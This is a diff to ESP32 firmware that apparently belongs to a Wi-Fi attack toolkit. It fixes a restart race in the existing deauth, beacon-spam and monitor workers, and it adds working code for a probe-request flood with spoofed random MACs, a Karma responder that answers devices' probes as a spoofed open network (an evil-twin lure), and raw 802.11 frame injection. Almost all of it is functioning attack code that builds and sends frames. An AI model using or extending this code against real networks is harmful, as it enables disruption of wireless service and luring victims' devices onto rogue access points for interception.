@@ -19,10 +19,26 @@
 #include "freertos/semphr.h"
 #include "freertos/queue.h"
 #include "lwip/sockets.h"
+#include "esp_random.h"
 #include <string.h>
 #include <stdlib.h>
 
 static const char *TAG = "wifi_atk";
+
+/* Wait (up to ~600ms) for a self-deleting worker to fully exit. Each worker NULLs
+ * its own handle right before vTaskDelete(NULL), so a cleared handle means "gone."
+ * Called from a start() BEFORE it re-arms the run flag: without this, a fast
+ * STOP->START re-sets the flag while the old worker is still asleep in vTaskDelay,
+ * so it re-observes the flag as true and keeps running — its TCB+stack orphaned
+ * (leak) and two workers now fight over the radio. The opaque vTaskDelay between
+ * reads prevents the compiler caching *h, so no volatile is needed. Returns false
+ * if the worker didn't exit in time. */
+static bool wait_task_exit(TaskHandle_t *h)
+{
+    for (int i = 0; i < 120 && *h != NULL; i++)
+        vTaskDelay(pdMS_TO_TICKS(5));
+    return *h == NULL;
+}
 
 /* ========== Deauth ========== */
 
@@ -92,6 +108,8 @@ static void deauth_task(void *arg)
 esp_err_t wifi_attack_deauth_start(const wifi_attack_deauth_config_t *config)
 {
     if (s_deauth_running) return ESP_ERR_INVALID_STATE;
+    /* Let a prior worker fully exit before reusing the handle/flag (see wait_task_exit). */
+    if (!wait_task_exit(&s_deauth_task)) return ESP_ERR_INVALID_STATE;
     s_deauth_cfg = *config;
     s_deauth_running = true;
 
@@ -616,6 +634,8 @@ esp_err_t wifi_attack_beacon_start(const wifi_attack_beacon_config_t *config)
     s_beacon_count = n;
     s_beacon_channel = config->channel > 0 ? config->channel : 1;
     s_beacon_interval_ms = config->interval_ms;
+    /* Let a prior worker fully exit before reusing the handle/flag (see wait_task_exit). */
+    if (!wait_task_exit(&s_beacon_task)) return ESP_ERR_INVALID_STATE;
     s_beacon_running = true;
 
     ESP_LOGI(TAG, "Beacon spam start: %u SSIDs ch=%d", n, s_beacon_channel);
@@ -709,6 +729,10 @@ static void mon_hop_task(void *arg)
 static esp_err_t mon_begin(uint8_t channel, wifi_attack_pkt_cb_t cb)
 {
     if (s_mon_running) return ESP_ERR_INVALID_STATE;
+    /* Let the previous session's drain + hop workers fully exit before re-arming
+     * s_mon_running, so a fast STOP->START can't orphan them (see wait_task_exit). */
+    if (!wait_task_exit(&s_mon_drain_task) || !wait_task_exit(&s_mon_hop_task))
+        return ESP_ERR_INVALID_STATE;
     if (!s_mon_q) {
         s_mon_q = xQueueCreateStatic(MON_QUEUE_DEPTH, sizeof(mon_item_t),
                                      s_mon_q_store, &s_mon_q_ctrl);
@@ -791,4 +815,212 @@ void wifi_attack_monitor_stats(uint32_t *total, uint32_t *dropped, uint8_t *buff
     if (total)    *total    = s_mon_total;
     if (dropped)  *dropped  = s_mon_dropped;
     if (buffered) *buffered = s_mon_q ? (uint8_t)uxQueueMessagesWaiting(s_mon_q) : 0;
+}
+
+/* ========================================================================= */
+/*  Probe-request flood                                                      */
+/* ========================================================================= */
+/* Broadcast 802.11 probe requests with a randomized source MAC each frame.
+ * With an SSID list, directed probes for those names; otherwise wildcard
+ * (broadcast) probes. Pollutes nearby AP/sniffer probe views and can nudge
+ * hidden APs to respond. Reuses the proven wifi_mgr_send_raw injection path. */
+
+#define PROBE_MAX_SSIDS 16
+
+/* Probe Request MAC header (24): FC=0x0040, broadcast DA/BSSID, random SA. */
+static const uint8_t probe_hdr_template[24] = {
+    0x40, 0x00,                         /* FC: mgmt, subtype 4 = probe request */
+    0x00, 0x00,                         /* Duration */
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* Addr1 DA: broadcast */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr2 SA: random (filled) */
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* Addr3 BSSID: broadcast */
+    0x00, 0x00,                         /* Sequence Control */
+};
+
+static bool         s_probe_running;
+static TaskHandle_t s_probe_task;
+static char         s_probe_ssids[PROBE_MAX_SSIDS][33];
+static uint8_t      s_probe_count;
+static uint8_t      s_probe_channel;
+
+static void probe_task(void *arg)
+{
+    wifi_mgr_start_monitor(s_probe_channel, NULL);
+    uint16_t seq = 0;
+    while (s_probe_running) {
+        uint8_t frame[128];
+        size_t  p;
+        memcpy(frame, probe_hdr_template, 24);
+        for (int i = 0; i < 6; i++) frame[10 + i] = (uint8_t)esp_random();
+        frame[10] = (frame[10] & 0xFE) | 0x02;   /* locally administered, unicast */
+        frame[22] = (uint8_t)((seq << 4) & 0xF0);
+        frame[23] = (uint8_t)((seq >> 4) & 0xFF);
+        seq = (seq + 1) & 0x0FFF;
+
+        size_t sl = 0;
+        if (s_probe_count) {
+            uint8_t idx = (uint8_t)(esp_random() % s_probe_count);
+            sl = strlen(s_probe_ssids[idx]);
+            if (sl > 32) sl = 32;
+            frame[24] = 0x00; frame[25] = (uint8_t)sl;
+            memcpy(&frame[26], s_probe_ssids[idx], sl);
+        } else {
+            frame[24] = 0x00; frame[25] = 0x00;  /* wildcard SSID */
+        }
+        p = 26 + sl;
+        memcpy(&frame[p], beacon_rates, sizeof(beacon_rates)); p += sizeof(beacon_rates);
+
+        wifi_mgr_send_raw(frame, p);
+        vTaskDelay(pdMS_TO_TICKS(2));
+    }
+    wifi_mgr_stop_monitor();
+    s_probe_task = NULL;
+    ESP_LOGI(TAG, "Probe flood stopped");
+    vTaskDelete(NULL);
+}
+
+esp_err_t wifi_attack_probe_start(const char ssids[][33], uint8_t count, uint8_t channel)
+{
+    if (s_probe_running) return ESP_ERR_INVALID_STATE;
+    if (!wait_task_exit(&s_probe_task)) return ESP_ERR_INVALID_STATE;
+
+    uint8_t n = count > PROBE_MAX_SSIDS ? PROBE_MAX_SSIDS : count;
+    for (uint8_t i = 0; i < n; i++) {
+        strncpy(s_probe_ssids[i], ssids[i], 32);
+        s_probe_ssids[i][32] = '\0';
+    }
+    s_probe_count   = n;
+    s_probe_channel = channel ? channel : 1;
+    s_probe_running = true;
+    ESP_LOGI(TAG, "Probe flood start: %u SSIDs ch=%u", n, s_probe_channel);
+    xTaskCreate(probe_task, "probe", 4096, NULL, 7, &s_probe_task);
+    return ESP_OK;
+}
+
+esp_err_t wifi_attack_probe_stop(void)
+{
+    s_probe_running = false;
+    return ESP_OK;
+}
+
+/* ========================================================================= */
+/*  Karma - probe-response auto-responder                                    */
+/* ========================================================================= */
+/* Listen (promiscuous) for directed probe requests and answer each with a
+ * probe response advertising the exact SSID the client asked for, from a
+ * spoofed open-network BSSID. A device probing for a known open SSID then sees
+ * "its" network here (classic Karma/evil-twin lure). The RX callback only
+ * queues work; a responder task does the TX (never TX from the RX context).
+ * Open-network only (capability privacy bit clear). */
+
+#define KARMA_RING 16
+
+typedef struct {
+    uint8_t sta[6];
+    uint8_t ssid_len;
+    char    ssid[33];
+} karma_req_t;
+
+/* Probe-response MAC header (24): DA=requester, SA/BSSID=spoofed AP (filled). */
+static const uint8_t proberesp_hdr_template[24] = {
+    0x50, 0x00,                         /* FC: mgmt, subtype 5 = probe response */
+    0x00, 0x00,                         /* Duration */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr1 DA: requester (filled) */
+    0x02, 0x11, 0x22, 0x33, 0x44, 0x55, /* Addr2 SA/BSSID: spoofed AP (filled) */
+    0x02, 0x11, 0x22, 0x33, 0x44, 0x55, /* Addr3 BSSID */
+    0x00, 0x00,                         /* Sequence Control */
+};
+
+static karma_req_t      s_karma_ring[KARMA_RING];
+static volatile uint8_t s_karma_head, s_karma_tail;   /* single-producer/consumer */
+static bool             s_karma_running;
+static TaskHandle_t     s_karma_task;
+static uint8_t          s_karma_channel;
+
+/* Wi-Fi RX context - must not block. Parse a directed probe request and queue it. */
+static void karma_rx(const uint8_t *buf, uint32_t len, wifi_pkt_rx_ctrl_t *rx)
+{
+    (void)rx;
+    if (!s_karma_running || !buf || len < 26) return;
+    if (buf[0] != 0x40) return;                       /* not a probe request */
+    uint8_t tag = buf[24], tlen = buf[25];
+    if (tag != 0 || tlen == 0 || tlen > 32) return;   /* wildcard/invalid -> ignore */
+    if (26u + tlen > len) return;
+
+    uint8_t nh = (uint8_t)((s_karma_head + 1) % KARMA_RING);
+    if (nh == s_karma_tail) return;                   /* ring full -> drop */
+    karma_req_t *k = &s_karma_ring[s_karma_head];
+    memcpy(k->sta, &buf[10], 6);
+    k->ssid_len = tlen;
+    memcpy(k->ssid, &buf[26], tlen);
+    k->ssid[tlen] = '\0';
+    s_karma_head = nh;
+}
+
+static void karma_task(void *arg)
+{
+    wifi_mgr_start_monitor(s_karma_channel, karma_rx);
+    while (s_karma_running) {
+        if (s_karma_tail == s_karma_head) { vTaskDelay(pdMS_TO_TICKS(5)); continue; }
+        karma_req_t k = s_karma_ring[s_karma_tail];
+        s_karma_tail = (uint8_t)((s_karma_tail + 1) % KARMA_RING);
+
+        uint8_t frame[128];
+        size_t  p = 24;
+        memcpy(frame, proberesp_hdr_template, 24);
+        memcpy(&frame[4], k.sta, 6);                          /* DA = requester */
+        frame[15] = (uint8_t)(k.ssid[0] ? k.ssid[0] : 0x55); /* vary BSSID by SSID */
+        memcpy(&frame[16], &frame[10], 6);                    /* Addr3 = Addr2 */
+
+        /* Fixed body: timestamp(8)=0, beacon interval(0x0064), capability
+         * (0x0001 = ESS, privacy OFF -> open network). */
+        memset(&frame[p], 0, 8); p += 8;
+        frame[p++] = 0x64; frame[p++] = 0x00;
+        frame[p++] = 0x01; frame[p++] = 0x00;
+        /* SSID (echo requested), supported rates, DS param (channel). */
+        frame[p++] = 0x00; frame[p++] = k.ssid_len;
+        memcpy(&frame[p], k.ssid, k.ssid_len); p += k.ssid_len;
+        memcpy(&frame[p], beacon_rates, sizeof(beacon_rates)); p += sizeof(beacon_rates);
+        frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = s_karma_channel;
+
+        for (int r = 0; r < 3 && s_karma_running; r++)        /* a few, to beat timing */
+            wifi_mgr_send_raw(frame, p);
+    }
+    wifi_mgr_stop_monitor();
+    s_karma_task = NULL;
+    ESP_LOGI(TAG, "Karma stopped");
+    vTaskDelete(NULL);
+}
+
+esp_err_t wifi_attack_karma_start(uint8_t channel)
+{
+    if (s_karma_running) return ESP_ERR_INVALID_STATE;
+    if (!wait_task_exit(&s_karma_task)) return ESP_ERR_INVALID_STATE;
+    s_karma_channel = channel ? channel : 1;
+    s_karma_head = s_karma_tail = 0;
+    s_karma_running = true;
+    ESP_LOGI(TAG, "Karma start ch=%u", s_karma_channel);
+    xTaskCreate(karma_task, "karma", 4096, NULL, 6, &s_karma_task);
+    return ESP_OK;
+}
+
+esp_err_t wifi_attack_karma_stop(void)
+{
+    s_karma_running = false;
+    return ESP_OK;
+}
+
+/* ========================================================================= */
+/*  Raw 802.11 injection (one-shot)                                          */
+/* ========================================================================= */
+/* Transmit a caller-supplied raw 802.11 frame. Self-contained: briefly enables
+ * monitor mode on `channel` so the TX path is live, injects, then restores.
+ * Do not run alongside another monitor/attack (it takes over monitor mode). */
+esp_err_t wifi_attack_raw_tx(uint8_t channel, const uint8_t *frame, size_t len)
+{
+    if (!frame || len < 10 || len > 1500) return ESP_ERR_INVALID_ARG;
+    wifi_mgr_start_monitor(channel ? channel : 1, NULL);
+    esp_err_t e = wifi_mgr_send_raw(frame, len);
+    wifi_mgr_stop_monitor();
+    return e;
 }
